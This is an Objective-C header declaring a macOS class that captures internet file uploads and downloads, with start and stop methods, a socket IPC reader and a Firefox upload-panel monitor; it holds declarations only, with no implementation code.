//
//  InternetFileUploadDownloadCapture.h
//  InternetFileTransferManager
//
//  Created by ophat on 9/16/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>

#import "SocketIPCReader.h"

@class FirefoxGetInfo,FirefoxUploadFilePanelMonitor;

@interface InternetFileUploadDownloadCapture : NSObject <SocketIPCDelegate> {
    NSOperationQueue    *mQueue;
    NSThread            *mThread;
    SocketIPCReader     *mIFTSocketReader;
    
    FirefoxUploadFilePanelMonitor *mPanelMonitor;
    
    id  mDelegate;
    SEL mSelector;
}

@property (nonatomic, readonly) NSOperationQueue *mQueue;
@property (nonatomic, assign) NSThread *mThread;

@property (nonatomic, assign) id mDelegate;
@property (nonatomic, assign) SEL mSelector;

- (void) startCapture;
- (void) stopCapture;

@end
